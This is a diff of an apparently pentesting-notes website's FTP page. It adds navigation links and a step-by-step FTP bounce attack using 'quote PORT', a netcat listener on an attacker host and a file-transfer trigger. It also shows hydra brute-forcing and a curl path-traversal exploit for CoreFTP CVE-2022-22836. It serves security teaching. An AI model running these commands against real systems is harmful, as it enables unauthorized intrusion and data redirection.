@@ -20192,6 +20192,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -20275,6 +20279,34 @@
     
   
     browsers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pentesting-cassandra/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    cassandra
   
 
     
@@ -20415,6 +20447,34 @@
     
   
     drupal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pentesting-filemanager/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Filemanager
   
 
     
@@ -28672,16 +28732,52 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>hydra -L users.txt -P pass.txt ftp://$ip:2121
 </span></code></pre></div></td></tr></table></div>
 <h3 id="ftp-bounce-attack">FTP Bounce Attack</h3>
-<p>An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. For instance, consider we are targetting an FTP Server <code>FTP_DMZ</code> exposed to the internet. Another device within the same network, <code>Internal_DMZ</code>, is not exposed to the internet. We can use the connection to the <code>FTP_DMZ</code> server to scan <code>Internal_DMZ</code> using the FTP Bounce attack and obtain information about the server's open ports.</p>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
-<span class="normal"><a href="#__codelineno-10-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="go">nmap -Pn -v -n -p80 -b anonymous:password@$ipFTPdmz $ipINTERNALdmz</span>
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="gp"># </span>-b<span class="w"> </span>The<span class="w"> </span><span class="sb">`</span>Nmap<span class="sb">`</span><span class="w"> </span>-b<span class="w"> </span>flag<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>used<span class="w"> </span>to<span class="w"> </span>perform<span class="w"> </span>an<span class="w"> </span>FTP<span class="w"> </span>bounce<span class="w"> </span>attack:<span class="w"> </span>
+<p>FTP Bounce Attack exploits the FTP protocol's ability to redirect traffic, masking the attack source. It uses an FTP server's <code>PORT</code> command to route data to a third party, making the attack seem to originate from the server. </p>
+<p><strong>How to Execute an FTP Bounce Attack:</strong></p>
+<ol>
+<li><code>Find an FTP</code> server that doesn't restrict the <code>PORT</code> command.</li>
+<li>Connect to the FTP server.</li>
+</ol>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>ftp<span class="w"> </span><span class="nv">$ip</span>
 </span></code></pre></div></td></tr></table></div>
+<ol>
+<li>Use the <code>PORT</code> command to redirect data to the target.</li>
+</ol>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>quote<span class="w"> </span>PORT<span class="w"> </span><span class="nv">$kaliIP</span>,<span class="nv">$kaliport</span>
+</span></code></pre></div></td></tr></table></div>
+<p>BUT, in reality the syntax is:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>quote PORT h1,h2,h3,h4,p1,p2
+</span></code></pre></div></td></tr></table></div>
+<p>where h1, h2, h3 h4 is your kali ip. Let's say we have the ip 192.168.45.230. And for the port we have port 5555. We need to calculate p1 and p2 to indicate the port.  Calculation:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span>
+<span class="normal"><a href="#__codelineno-13-2">2</a></span>
+<span class="normal"><a href="#__codelineno-13-3">3</a></span>
+<span class="normal"><a href="#__codelineno-13-4">4</a></span>
+<span class="normal"><a href="#__codelineno-13-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>5555 / 256 = 21 remainder 179
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3"></a>Therefore:
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4"></a>p1=21
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5"></a>p2=179
+</span></code></pre></div></td></tr></table></div>
+<p>So final command would be:</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>quote<span class="w"> </span>PORT<span class="w"> </span><span class="m">192</span>,168,45,230,21,179
+</span></code></pre></div></td></tr></table></div>
+<ol>
+<li>Set a listener in your kali</li>
+</ol>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">5555</span>
+</span></code></pre></div></td></tr></table></div>
+<ol>
+<li>Initiate a file transfer or command that sends data to the target. From the ftp connection</li>
+</ol>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a>get filename
+</span></code></pre></div></td></tr></table></div>
+<p>This command requests a file from the FTP server, which is then sent to the specified target, exploiting the bounce capability.</p>
 <h3 id="coreftp-server-build-725-directory-traversal-authenticated">CoreFTP Server build 725 - Directory Traversal (Authenticated)</h3>
 <p><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-22836">CVE-2022-22836</a> |   <a href="https://www.exploit-db.com/exploits/50652">exploit</a></p>
 <p>Summary: This FTP service uses an HTTP POST request to upload files. However, the CoreFTP service allows an HTTP PUT request, which we can use to write content to files. </p>
 <p>The <a href="https://www.exploit-db.com/exploits/50652">exploit</a> for this attack is relatively straightforward, based on a single <code>cURL</code> command.</p>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>curl<span class="w"> </span>-k<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: &lt;IP&gt;&quot;</span><span class="w"> </span>--basic<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;:&lt;password&gt;<span class="w"> </span>--data-binary<span class="w"> </span><span class="s2">&quot;PoC.&quot;</span><span class="w"> </span>--path-as-is<span class="w"> </span>https://&lt;IP&gt;/../../../../../../whoops
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a>curl<span class="w"> </span>-k<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: &lt;IP&gt;&quot;</span><span class="w"> </span>--basic<span class="w"> </span>-u<span class="w"> </span>&lt;username&gt;:&lt;password&gt;<span class="w"> </span>--data-binary<span class="w"> </span><span class="s2">&quot;PoC.&quot;</span><span class="w"> </span>--path-as-is<span class="w"> </span>https://&lt;IP&gt;/../../../../../../whoops
 </span></code></pre></div></td></tr></table></div>
 <p>We create a raw HTTP <code>PUT</code> request (<code>-X PUT</code>) with basic auth (<code>--basic -u &lt;username&gt;:&lt;password&gt;</code>), the path for the file (<code>--path-as-is https://&lt;IP&gt;/../../../../../whoops</code>), and its content (<code>--data-binary "PoC."</code>) with this command. Additionally, we specify the host header (<code>-H "Host: &lt;IP&gt;"</code>) with the IP address of our target system.</p>
 <h2 id="other-ftp-services">Other FTP services</h2>
@@ -28694,52 +28790,52 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </ul>
 <p>Because of the lack of security, TFTP, unlike FTP, may only be used in local and protected networks.</p>
 <h4 id="basic-usage_1">Basic usage</h4>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-12-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-12-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-12-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-12-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-12-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-12-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-12-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-12-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-12-10">10</a></span>
-<span class="normal"><a href="#__codelineno-12-11">11</a></span>
-<span class="normal"><a href="#__codelineno-12-12">12</a></span>
-<span class="normal"><a href="#__codelineno-12-13">13</a></span>
-<span class="normal"><a href="#__codelineno-12-14">14</a></span>
-<span class="normal"><a href="#__codelineno-12-15">15</a></span>
-<span class="normal"><a href="#__codelineno-12-16">16</a></span>
-<span class="normal"><a href="#__codelineno-12-17">17</a></span>
-<span class="normal"><a href="#__codelineno-12-18">18</a></span>
-<span class="normal"><a href="#__codelineno-12-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a># Sets the remote host, and optionally the port, for file transfers.
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a>connect
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3"></a>
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4"></a># Transfers a file or set of files from the remote host to the local host.
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5"></a>get
-</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6"></a>
-</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7"></a># Transfers a file or set of files from the local host onto the remote host
-</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8"></a>put
-</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9"></a>
-</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10"></a># Exits tftp
-</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11"></a>quit
-</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12"></a>
-</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13"></a># Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on
-</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14"></a>status
-</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15"></a>
-</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16"></a># Turns verbose mode, which displays additional information during file transfer, on or off.
-</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17"></a>verbose 
-</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18"></a>
-</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19"></a># Unlike the FTP client, TFTP does not have directory listing functionality.
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-18-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-18-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-18-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-18-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-18-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-18-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-18-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-18-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-18-10">10</a></span>
+<span class="normal"><a href="#__codelineno-18-11">11</a></span>
+<span class="normal"><a href="#__codelineno-18-12">12</a></span>
+<span class="normal"><a href="#__codelineno-18-13">13</a></span>
+<span class="normal"><a href="#__codelineno-18-14">14</a></span>
+<span class="normal"><a href="#__codelineno-18-15">15</a></span>
+<span class="normal"><a href="#__codelineno-18-16">16</a></span>
+<span class="normal"><a href="#__codelineno-18-17">17</a></span>
+<span class="normal"><a href="#__codelineno-18-18">18</a></span>
+<span class="normal"><a href="#__codelineno-18-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a># Sets the remote host, and optionally the port, for file transfers.
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2"></a>connect
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3"></a>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4"></a># Transfers a file or set of files from the remote host to the local host.
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5"></a>get
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6"></a>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7"></a># Transfers a file or set of files from the local host onto the remote host
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8"></a>put
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9"></a>
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10"></a># Exits tftp
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11"></a>quit
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12"></a>
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13"></a># Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14"></a>status
+</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15"></a>
+</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16"></a># Turns verbose mode, which displays additional information during file transfer, on or off.
+</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17"></a>verbose 
+</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18"></a>
+</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19"></a># Unlike the FTP client, TFTP does not have directory listing functionality.
 </span></code></pre></div></td></tr></table></div>
 <h3 id="vsftpd">vsFTPd</h3>
 <p>One of the most used FTP servers on Linux-based distributions is <a href="https://security.appspot.com/vsftpd.html">vsFTPd</a>. </p>
 <h4 id="installation_1">Installation</h4>
-<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="go">sudo apt install vsftpd </span>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a><span class="go">sudo apt install vsftpd </span>
 </span></code></pre></div></td></tr></table></div>
 <h4 id="configuration-file">Configuration file</h4>
 <p>The default configuration of vsFTPd can be found in <code>/etc/vsftpd.conf</code>.</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a>cat /etc/vsftpd.conf | grep -v &quot;#&quot;
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a>cat /etc/vsftpd.conf | grep -v &quot;#&quot;
 </span></code></pre></div></td></tr></table></div>
 <table>
 <thead>
@@ -28804,7 +28900,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </tbody>
 </table>
 <p>In addition, there is a file called <code>/etc/ftpusers</code> that we also need to pay attention to, as this file is used to deny certain users access to the FTP service. </p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>cat /etc/ftpusers
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a>cat /etc/ftpusers
 </span></code></pre></div></td></tr></table></div>
 <p>Dangerous settings:</p>
 <table>
@@ -28844,7 +28940,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="January 24, 2026 18:03:47 UTC"><span class="timeago" datetime="2026-01-24T18:03:47+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="January 24, 2026 18:03:47 UTC">2026-01-24</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="February 15, 2026 15:52:07 UTC"><span class="timeago" datetime="2026-02-15T15:52:07+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="February 15, 2026 15:52:07 UTC">2026-02-15</span></small></br>
 
 
     <small>Created: January 1, 2023 21:59:36</small>
